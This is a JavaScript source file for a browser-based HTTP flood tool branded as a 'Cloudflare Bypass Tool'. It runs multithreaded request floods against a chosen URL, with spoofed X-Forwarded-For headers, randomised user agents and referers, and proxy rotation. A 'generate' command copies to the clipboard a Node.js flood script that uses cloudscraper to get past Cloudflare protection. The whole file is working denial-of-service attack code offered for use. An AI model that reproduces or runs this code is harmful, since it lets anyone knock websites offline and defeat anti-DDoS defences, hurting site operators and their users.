// DOM elements
const urlInput = document.getElementById('url');
const timeInput = document.getElementById('time');
const intensitySelect = document.getElementById('intensity');
const methodSelect = document.getElementById('method');
const delayInput = document.getElementById('delay');
const enableCookies = document.getElementById('enable-cookies');
const enableReferers = document.getElementById('enable-referers');
const proxyList = document.getElementById('proxy-list');
const rotateProxies = document.getElementById('rotate-proxies');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const generateScriptBtn = document.getElementById('generateScriptBtn');
const statusDiv = document.getElementById('status');
const consoleDiv = document.getElementById('console');
const terminalDiv = document.getElementById('console-terminal');
const terminalInput = document.getElementById('terminal-input');
const reqCountEl = document.getElementById('reqCount');
const successCountEl = document.getElementById('successCount');
const errorCountEl = document.getElementById('errorCount');
const rpsCountEl = document.getElementById('rpsCount');
const workersCountEl = document.getElementById('workersCount');
const proxyCountEl = document.getElementById('proxyCount');
const consoleLineCount = document.getElementById('console-line-count');
const progressContainer = document.getElementById('progress-container');
const progressBar = document.getElementById('progress-bar');
const clearConsoleBtn = document.getElementById('clearConsoleBtn');
const exportLogsBtn = document.getElementById('exportLogsBtn');
const tabs = document.querySelectorAll('.tab');
const tabContents = document.querySelectorAll('.tab-content');

// Variables
let workers = [];
let isRunning = false;
let requestCount = 0;
let successCount = 0;
let errorCount = 0;
let startTime = 0;
let lastUpdateTime = 0;
let lastRequestCount = 0;
let consoleLines = 0;
let attackDuration = 0;
let proxyArray = [];
let currentProxyIndex = 0;
let statusInterval;
let terminalHistory = [];
let terminalHistoryIndex = -1;

// Tab switching
tabs.forEach(tab => {
    tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tabContents.forEach(c => c.classList.remove('active'));

        tab.classList.add('active');
        document.getElementById(`${tab.dataset.tab}-tab`).classList.add('active');
    });
});

// Terminal functionality
terminalInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        const command = terminalInput.value.trim();
        if (command) {
            terminalHistory.push(command);
            terminalHistoryIndex = terminalHistory.length;
            processCommand(command);
            terminalInput.value = '';
        }
    } else if (e.key === 'ArrowUp') {
        if (terminalHistoryIndex > 0) {
            terminalHistoryIndex--;
            terminalInput.value = terminalHistory[terminalHistoryIndex];
        }
    } else if (e.key === 'ArrowDown') {
        if (terminalHistoryIndex < terminalHistory.length - 1) {
            terminalHistoryIndex++;
            terminalInput.value = terminalHistory[terminalHistoryIndex];
        } else {
            terminalHistoryIndex = terminalHistory.length;
            terminalInput.value = '';
        }
    }
});

function processCommand(command) {
    addTerminalLine(`root@shadow:~# ${command}`, 'command');

    // Process commands
    const args = command.split(' ');
    const cmd = args[0].toLowerCase();

    switch(cmd) {
        case 'help':
            addTerminalLine('Available commands:', 'response');
            addTerminalLine('help - Show this help', 'response');
            addTerminalLine('clear - Clear terminal', 'response');
            addTerminalLine('attack <url> <time> - Start attack', 'response');
            addTerminalLine('stop - Stop attack', 'response');
            addTerminalLine('status - Show attack status', 'response');
            addTerminalLine('proxies - List loaded proxies', 'response');
            addTerminalLine('generate - Generate Node.js script', 'response');
            break;

        case 'clear':
            terminalDiv.innerHTML = '';
            break;

        case 'attack':
            if (args.length < 3) {
                addTerminalLine('Usage: attack <url> <time>', 'error');
                return;
            }
            urlInput.value = args[1];
            timeInput.value = args[2];
            startAttack();
            break;

        case 'stop':
            stopAttack();
            addTerminalLine('Attack stopped', 'success');
            break;

        case 'status':
            addTerminalLine(`Attack Status: ${isRunning ? 'RUNNING' : 'STOPPED'}`, 'response');
            addTerminalLine(`Requests: ${requestCount}`, 'response');
            addTerminalLine(`Success: ${successCount}`, 'response');
            addTerminalLine(`Errors: ${errorCount}`, 'response');
            break;

        case 'proxies':
            if (proxyArray.length === 0) {
                addTerminalLine('No proxies loaded', 'response');
            } else {
                addTerminalLine(`Loaded ${proxyArray.length} proxies:`, 'response');
                proxyArray.forEach(proxy => {
                    addTerminalLine(`${proxy.host}:${proxy.port}`, 'response');
                });
            }
            break;

        case 'generate':
            generateNodeScript();
            addTerminalLine('Node.js script generated and copied to clipboard', 'success');
            break;

        default:
            addTerminalLine(`Command not found: ${cmd}`, 'error');
    }
}

function addTerminalLine(text, type = 'response') {
    const line = document.createElement('div');
    line.className = 'terminal-line';

    if (type === 'command') {
        line.innerHTML = `<span class="console-command">${text}</span>`;
    } else if (type === 'error') {
        line.innerHTML = `<span class="console-error">${text}</span>`;
    } else if (type === 'success') {
        line.innerHTML = `<span class="console-success">${text}</span>`;
    } else {
        line.innerHTML = `<span class="console-response">${text}</span>`;
    }

    terminalDiv.appendChild(line);
    terminalDiv.scrollTop = terminalDiv.scrollHeight;
}

// Logging functions
function log(message, type = 'info') {
    const timestamp = new Date().toLocaleTimeString();
    const line = document.createElement('div');
    line.className = 'console-line';

    if (type === 'error') {
        line.innerHTML = `<span class="timestamp">[${timestamp}]</span> <span class="console-error">${message}</span>`;
    } else if (type === 'success') {
        line.innerHTML = `<span class="timestamp">[${timestamp}]</span> <span class="console-success">${message}</span>`;
    } else {
        line.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
    }

    consoleDiv.appendChild(line);
    consoleDiv.scrollTop = consoleDiv.scrollHeight;

    consoleLines++;
    consoleLineCount.textContent = consoleLines;

    // Keep console from getting too large
    if (consoleLines > 500) {
        consoleDiv.removeChild(consoleDiv.firstChild);
        consoleLines--;
    }
}

function updateProgressBar() {
    if (!isRunning) return;

    const now = Date.now();
    const elapsed = (now - startTime) / 1000;
    const progress = (elapsed / attackDuration) * 100;

    progressBar.style.width = `${Math.min(100, progress)}%`;

    if (progress >= 100) {
        progressBar.style.background = 'linear-gradient(90deg, var(--neon-red), #ff5555)';
    }
}

function updateStatus() {
    const now = Date.now();
    const elapsed = (now - startTime) / 1000;
    const sinceLastUpdate = (now - lastUpdateTime) / 1000;

    // Calculate requests per second
    let rps = 0;
    if (sinceLastUpdate > 0) {
        rps = ((requestCount - lastRequestCount) / sinceLastUpdate).toFixed(1);
    }

    reqCountEl.textContent = requestCount.toLocaleString();
    successCountEl.textContent = successCount.toLocaleString();
    errorCountEl.textContent = errorCount.toLocaleString();
    rpsCountEl.textContent = rps;
    workersCountEl.textContent = workers.length;
    proxyCountEl.textContent = proxyArray.length;

    statusDiv.className = 'info pulse';
    statusDiv.textContent = `STATUS: RUNNING | REQUESTS: ${requestCount.toLocaleString()} | SUCCESS: ${successCount.toLocaleString()} | ERRORS: ${errorCount.toLocaleString()} | RPS: ${rps} | THREADS: ${workers.length}`;

    lastUpdateTime = now;
    lastRequestCount = requestCount;

    updateProgressBar();
}

// Helper functions
function randomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function randomUserAgent() {
    const versions = {
        chrome: Math.floor(Math.random() * 30) + 100,
        firefox: Math.floor(Math.random() * 30) + 90,
        safari: Math.floor(Math.random() * 5) + 15,
        ios: Math.floor(Math.random() * 5) + 14
    };

    const agents = [
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${versions.chrome}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${versions.firefox}.0) Gecko/20100101 Firefox/${versions.firefox}.0`,
        `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${versions.safari}.0 Safari/605.1.15`,
        `Mozilla/5.0 (iPhone; CPU iPhone OS ${versions.ios}_${Math.floor(Math.random() * 5)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${versions.ios}.0 Mobile/15E148 Safari/604.1`,
        `Mozilla/5.0 (Linux; Android ${Math.floor(Math.random() * 5) + 10}; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${versions.chrome}.0.0.0 Mobile Safari/537.36`,
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${versions.chrome}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${versions.chrome}.0.0.0 Safari/537.36 Edg/${versions.chrome}.0.0.0`
    ];
    return agents[Math.floor(Math.random() * agents.length)];
}

function randomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getRequestMethods() {
    return ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH'];
}

function getRandomMethod(primaryMethod = 'mixed') {
    if (primaryMethod === 'get') return 'GET';
    if (primaryMethod === 'post') return 'POST';
    if (primaryMethod === 'head') return 'HEAD';

    const methods = getRequestMethods();
    if (primaryMethod === 'random') return methods[Math.floor(Math.random() * methods.length)];

    // For mixed mode, weight towards GET and POST
    const weightedMethods = [
        'GET', 'GET', 'GET', 'GET', 
        'POST', 'POST', 'POST',
        'HEAD',
        'OPTIONS',
        'PUT',
        'DELETE',
        'PATCH'
    ];
    return weightedMethods[Math.floor(Math.random() * weightedMethods.length)];
}

function getRandomReferer() {
    const domains = [
        'google.com', 'youtube.com', 'facebook.com', 'twitter.com', 
        'instagram.com', 'linkedin.com', 'reddit.com', 'wikipedia.org',
        'amazon.com', 'ebay.com', 'bing.com', 'yahoo.com',
        'msn.com', 'duckduckgo.com', 'github.com', 'stackoverflow.com'
    ];

    const protocols = ['http://', 'https://'];
    const paths = ['', 'search', 'results', 'query', 'page', 'article', 'post'];

    const protocol = protocols[Math.floor(Math.random() * protocols.length)];
    const domain = domains[Math.floor(Math.random() * domains.length)];
    const path = paths[Math.floor(Math.random() * paths.length)];
    const query = randomString(Math.floor(Math.random() * 10) + 5);

    if (path) {
        return `${protocol}${domain}/${path}?q=${query}`;
    }
    return `${protocol}${domain}`;
}

function getRandomAcceptHeader() {
    const types = [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/json',
        '*/*'
    ];
    return types[Math.floor(Math.random() * types.length)];
}

function getRandomContentType() {
    const types = [
        'application/x-www-form-urlencoded',
        'application/json',
        'multipart/form-data',
        'text/plain',
        'application/xml'
    ];
    return types[Math.floor(Math.random() * types.length)];
}

function getRandomLanguage() {
    const languages = [
        'en-US,en;q=0.9',
        'es-ES,es;q=0.9',
        'fr-FR,fr;q=0.9',
        'de-DE,de;q=0.9',
        'ja-JP,ja;q=0.9',
        'zh-CN,zh;q=0.9',
        'ru-RU,ru;q=0.9'
    ];
    return languages[Math.floor(Math.random() * languages.length)];
}

function getRandomEncoding() {
    const encodings = [
        'gzip, deflate, br',
        'gzip, deflate',
        'br, gzip, deflate',
        'deflate, gzip',
        'identity'
    ];
    return encodings[Math.floor(Math.random() * encodings.length)];
}

function parseProxyList(proxyText) {
    const lines = proxyText.split('\n')
        .map(line => line.trim())
        .filter(line => line.length > 0);

    return lines.map(line => {
        const [host, port] = line.split(':');
        return { host, port: parseInt(port) || 8080 };
    });
}

// Attack functions
function startAttack() {
    if (!urlInput.value) {
        log('Please enter a target URL', 'error');
        urlInput.focus();
        return;
    }

    // Validate URL format
    try {
        new URL(urlInput.value);
    } catch (e) {
        log('Invalid URL format. Please include http:// or https://', 'error');
        urlInput.focus();
        return;
    }

    // Parse proxy list if available
    proxyArray = parseProxyList(proxyList.value);
    if (proxyArray.length > 0) {
        log(`Loaded ${proxyArray.length} proxies from list`, 'success');
    }

    const duration = parseInt(timeInput.value) || 60;
    requestCount = 0;
    successCount = 0;
    errorCount = 0;
    consoleLines = 0;
    consoleLineCount.textContent = '0';

    startTime = Date.now();
    lastUpdateTime = startTime;
    attackDuration = duration;
    isRunning = true;
    startBtn.disabled = true;
    stopBtn.disabled = false;
    progressContainer.classList.remove('hidden');
    progressBar.style.width = '0%';
    progressBar.style.background = 'linear-gradient(90deg, var(--neon-red), var(--neon-purple))';

    // Determine worker count based on intensity
    let workerCount = 8; // default medium
    switch(intensitySelect.value) {
        case 'low': workerCount = 4; break;
        case 'high': workerCount = 16; break;
        case 'extreme': workerCount = 32; break;
    }

    log(`Starting attack with ${workerCount} workers for ${duration} seconds`, 'success');
    log(`Target: ${urlInput.value}`, 'info');
    log(`Method: ${methodSelect.value} | Delay: ${delayInput.value || 100}ms`, 'info');
    log(`Cookies: ${enableCookies.checked ? 'ENABLED' : 'DISABLED'} | Referers: ${enableReferers.checked ? 'ENABLED' : 'DISABLED'}`, 'info');
    if (proxyArray.length > 0) {
        log(`Proxies: ${proxyArray.length} | Rotation: ${rotateProxies.checked ? 'ON' : 'OFF'}`, 'info');
    }

    // Start status updates
    statusInterval = setInterval(updateStatus, 1000);

    // Create workers
    for (let i = 0; i < workerCount; i++) {
        const worker = new Worker(URL.createObjectURL(new Blob([`
            let requestCount = 0;
            let successCount = 0;
            let errorCount = 0;
            let attackInterval;
            const proxyList = ${JSON.stringify(proxyArray)};
            let currentProxyIndex = 0;
            
            function getNextProxy() {
                if (proxyList.length === 0) return null;
                
                if (${rotateProxies.checked}) {
                    currentProxyIndex = (currentProxyIndex + 1) % proxyList.length;
                    return proxyList[currentProxyIndex];
                }
                
                return proxyList[currentProxyIndex];
            }

            function randomString(length) {
                const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < length; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            function randomIP() {
                return \`\${Math.floor(Math.random() * 255)}.\${Math.floor(Math.random() * 255)}.\${Math.floor(Math.random() * 255)}.\${Math.floor(Math.random() * 255)}\`;
            }

            function randomUserAgent() {
                const versions = {
                    chrome: Math.floor(Math.random() * 30) + 100,
                    firefox: Math.floor(Math.random() * 30) + 90,
                    safari: Math.floor(Math.random() * 5) + 15,
                    ios: Math.floor(Math.random() * 5) + 14
                };
                
                const agents = [
                    \`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/\${versions.chrome}.0.0.0 Safari/537.36\`,
                    \`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:\${versions.firefox}.0) Gecko/20100101 Firefox/\${versions.firefox}.0\`,
                    \`Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/\${versions.safari}.0 Safari/605.1.15\`,
                    \`Mozilla/5.0 (iPhone; CPU iPhone OS \${versions.ios}_\${Math.floor(Math.random() * 5)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/\${versions.ios}.0 Mobile/15E148 Safari/604.1\`,
                    \`Mozilla/5.0 (Linux; Android \${Math.floor(Math.random() * 5) + 10}; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/\${versions.chrome}.0.0.0 Mobile Safari/537.36\`,
                    \`Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/\${versions.chrome}.0.0.0 Safari/537.36\`,
                    \`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/\${versions.chrome}.0.0.0 Safari/537.36 Edg/\${versions.chrome}.0.0.0\`
                ];
                return agents[Math.floor(Math.random() * agents.length)];
            }

            function getRandomMethod(primaryMethod) {
                if (primaryMethod === 'get') return 'GET';
                if (primaryMethod === 'post') return 'POST';
                if (primaryMethod === 'head') return 'HEAD';
                
                if (primaryMethod === 'random') return ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH'][Math.floor(Math.random() * 7)];
                
                // For mixed mode, weight towards GET and POST
                const weightedMethods = [
                    'GET', 'GET', 'GET', 'GET', 
                    'POST', 'POST', 'POST',
                    'HEAD',
                    'OPTIONS',
                    'PUT',
                    'DELETE',
                    'PATCH'
                ];
                return weightedMethods[Math.floor(Math.random() * weightedMethods.length)];
            }

            function getRandomReferer() {
                const domains = ['google.com', 'youtube.com', 'facebook.com', 'twitter.com', 
                                'instagram.com', 'linkedin.com', 'reddit.com', 'wikipedia.org',
                                'amazon.com', 'ebay.com', 'bing.com', 'yahoo.com',
                                'msn.com', 'duckduckgo.com', 'github.com', 'stackoverflow.com'];
                const protocols = ['http://', 'https://'];
                const paths = ['', 'search', 'results', 'query', 'page', 'article', 'post'];
                
                const protocol = protocols[Math.floor(Math.random() * protocols.length)];
                const domain = domains[Math.floor(Math.random() * domains.length)];
                const path = paths[Math.floor(Math.random() * paths.length)];
                const query = randomString(Math.floor(Math.random() * 10) + 5);
                
                if (path) {
                    return \`\${protocol}\${domain}/\${path}?q=\${query}\`;
                }
                return \`\${protocol}\${domain}\`;
            }

            function getRandomAcceptHeader() {
                const types = [
                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/json',
                    '*/*'
                ];
                return types[Math.floor(Math.random() * types.length)];
            }

            function sendRequest(url, methodPref, useCookies, useReferers) {
                const rand = randomString(10);
                const ip = randomIP();
                const method = getRandomMethod(methodPref);
                
                const headers = {
                    'User-Agent': randomUserAgent(),
                    'Accept': getRandomAcceptHeader(),
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'X-Forwarded-For': ip,
                    'X-Requested-With': 'XMLHttpRequest'
                };

                if (useReferers) {
                    headers['Origin'] = \`http://\${rand}.com\`;
                    headers['Referer'] = getRandomReferer();
                }

                let body = null;
                if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                    body = \`param1=\${randomString(5)}&param2=\${randomString(8)}\`;
                }

                requestCount++;
                
                const proxy = getNextProxy();
                let fetchUrl = url;
                let fetchOptions = {
                    method: method,
                    headers: headers,
                    body: body,
                    mode: 'no-cors',
                    cache: 'no-store',
                    credentials: useCookies ? 'include' : 'omit'
                };

                if (proxy) {
                    fetchUrl = \`https://cors-anywhere.herokuapp.com/\${url}\`;
                    fetchOptions.headers['x-requested-with'] = 'XMLHttpRequest';
                }

                fetch(fetchUrl, fetchOptions)
                .then(response => {
                    successCount++;
                    self.postMessage({
                        type: 'success',
                        count: requestCount,
                        success: successCount,
                        error: errorCount,
                        workerId: ${i},
                        method: method,
                        status: response.status
                    });
                })
                .catch(error => {
                    errorCount++;
                    self.postMessage({
                        type: 'error',
                        count: requestCount,
                        success: successCount,
                        error: errorCount,
                        message: error.message,
                        workerId: ${i},
                        method: method
                    });
                });
            }

            self.onmessage = function(e) {
                if (e.data.command === 'start') {
                    const url = e.data.url;
                    const methodPref = e.data.method;
                    const useCookies = e.data.useCookies;
                    const useReferers = e.data.useReferers;
                    const delay = e.data.delay;
                    
                    attackInterval = setInterval(() => {
                        sendRequest(url, methodPref, useCookies, useReferers);
                    }, delay + Math.random() * delay * 0.5);
                }
                else if (e.data.command === 'stop') {
                    clearInterval(attackInterval);
                    self.postMessage({
                        type: 'stopped',
                        count: requestCount,
                        success: successCount,
                        error: errorCount,
                        workerId: ${i}
                    });
                }
            };
        `], {type: 'application/javascript'})));

        worker.onmessage = function(e) {
            const data = e.data;
            requestCount = data.count;
            successCount = data.success;
            errorCount = data.error;

            if (data.type === 'success') {
                log(`Worker ${data.workerId}: ${data.method} request #${data.count} succeeded (HTTP ${data.status})`, 'success');
            } else if (data.type === 'error') {
                log(`Worker ${data.workerId}: ${data.method} request failed - ${data.message}`, 'error');
            }
        };

        worker.postMessage({
            command: 'start',
            url: urlInput.value,
            method: methodSelect.value,
            useCookies: enableCookies.checked,
            useReferers: enableReferers.checked,
            delay: parseInt(delayInput.value) || 100
        });

        workers.push(worker);
    }

    // Stop after duration
    setTimeout(() => {
        if (isRunning) {
            stopAttack();
            log(`Attack completed after ${duration} seconds`, 'success');
            statusDiv.className = 'success';
            statusDiv.textContent = `STATUS: COMPLETED | TOTAL REQUESTS: ${requestCount.toLocaleString()}`;
            statusDiv.classList.remove('pulse');
        }
    }, duration * 1000);
}

function stopAttack() {
    if (!isRunning) return;

    isRunning = false;
    startBtn.disabled = false;
    stopBtn.disabled = true;
    clearInterval(statusInterval);
    statusDiv.classList.remove('pulse');

    // Terminate all workers
    workers.forEach(worker => {
        worker.postMessage({command: 'stop'});
        worker.terminate();
    });
    workers = [];
}

function generateNodeScript() {
    const script = `var cloudscraper = require('cloudscraper');
var request = require('request');
var randomstring = require("randomstring");

var args = process.argv.slice(2);

randomByte = function() {
    return Math.round(Math.random()*256);
}

if (process.argv.length <= 2) {
    console.log("Usage: node CFBypass.js <url> <time>");
    console.log("Example: node CFBypass.js http://example.com 60");
    process.exit(-1);
}
var url = process.argv[2];
var time = process.argv[3];

var int = setInterval(() => {
    var cookie = 'ASDFGHJKLZXCVBNMQWERTYUIOPasdfghjklzxcvbnmqwertyuiop1234567890';
    var useragent = 'proxy.txt';
    cloudscraper.get(url, function(error, response, body) {
        if (error) {
            console.log('Error occurred');
        } else {
            var parsed = JSON.parse(JSON.stringify(response));
            cookie = (parsed["request"]["headers"]["cookie"]);
            useragent = (parsed["request"]["headers"]["User-Agent"]);
        }
        var rand = randomstring.generate({
            length: 10,
            charset: 'abcdefghijklmnopqstuvwxyz0123456789'
          });
        var ip = randomByte() +'.' +
            randomByte() +'.' +
            randomByte() +'.' +
            randomByte();
        const options = {
            url: url,
            headers: {
                'User-Agent': useragent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '2000',
                'cookie': cookie,
                'Origin': 'http://' + rand + '.com',
                'Referrer': 'http://google.com/' + rand,
                'X-Forwarded-For': ip
            }
        };
    
        function callback(error, response, body) {
            if (!error) {
                console.log('Successful request sent');
            }
        }
        request(options, callback);
    });    
}, 100);

setTimeout(() => {
    clearInterval(int);
    console.log('Attack completed');
}, time * 1000);

process.on('uncaughtException', function(err) {
    // Suppress errors
});

process.on('unhandledRejection', function(err) {
    // Suppress errors
});`;

    navigator.clipboard.writeText(script).then(() => {
        log('Node.js script copied to clipboard!', 'success');
    }).catch(err => {
        log('Failed to copy script: ' + err, 'error');
    });
}

function exportLogs() {
    const logs = Array.from(consoleDiv.children).map(line => line.textContent).join('\n');
    const blob = new Blob([logs], {type: 'text/plain'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `shadow-reaper-logs-${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// Event listeners
startBtn.addEventListener('click', startAttack);
stopBtn.addEventListener('click', stopAttack);
generateScriptBtn.addEventListener('click', generateNodeScript);
clearConsoleBtn.addEventListener('click', () => {
    consoleDiv.innerHTML = '';
    consoleLines = 0;
    consoleLineCount.textContent = '0';
});
exportLogsBtn.addEventListener('click', exportLogs);

// Initialize terminal
addTerminalLine('Loft X01 v3.1.4 - Advanced Cloudflare Bypass Tool', 'response');
addTerminalLine('Type "help" for available commands', 'response');

// Error handling
window.addEventListener('error', (event) => {
    log(`Uncaught error: ${event.message}`, 'error');
});

window.addEventListener('unhandledrejection', (event) => {
    log(`Unhandled rejection: ${event.reason}`, 'error');
});